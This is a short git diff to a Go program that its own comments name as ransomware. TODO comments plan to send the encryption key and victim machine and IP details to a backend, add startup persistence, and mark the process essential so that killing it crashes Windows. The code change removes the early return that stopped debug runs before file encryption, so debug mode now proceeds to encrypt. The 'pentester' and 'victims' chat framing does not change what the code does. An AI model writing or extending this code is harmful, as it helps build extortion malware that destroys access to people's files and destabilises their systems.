@@ -9,7 +9,7 @@ import (
 )
 
 //TODO:
-//make a package that checks user idle time using xinput test-xi2 --root for linux and winapi for windows
+//make a package that checks user idle time using xinput test-xi2 --root for linux and winapi for windows and implement it here
 //if xinput isn't installed check some other way?
 //uncheck read only from files if able to do so and check if it doesn't ignore readonly from windows files
 //Send encryption key, computer and ip details to a backend (as JSON)
@@ -18,8 +18,6 @@ import (
 //add the option to change the user's wallpaper
 //add stuff to startup*
 //check if unicode paths work correctly
-//maybe add a setting to start the ransomware when the user was afk for more than X minutes
-//clean the main function making functions in the ransomware package
 //on windows persistence could be added by marking the process as "essential", making the computer BSOD on process exit
 //send the data
 //make a live thingy panel, so "victims" could talk to the pentester through a live chat
@@ -64,8 +62,7 @@ func main() {
 	if ransom.Debug {
 		fmt.Println("WARNING: Starting to encrypt files...")
 		fmt.Println("Press enter to continue")
-		fmt.Scan()
-		return
+		fmt.Scanln()
 	}
 
 	keyBytes := []byte(data.Key)
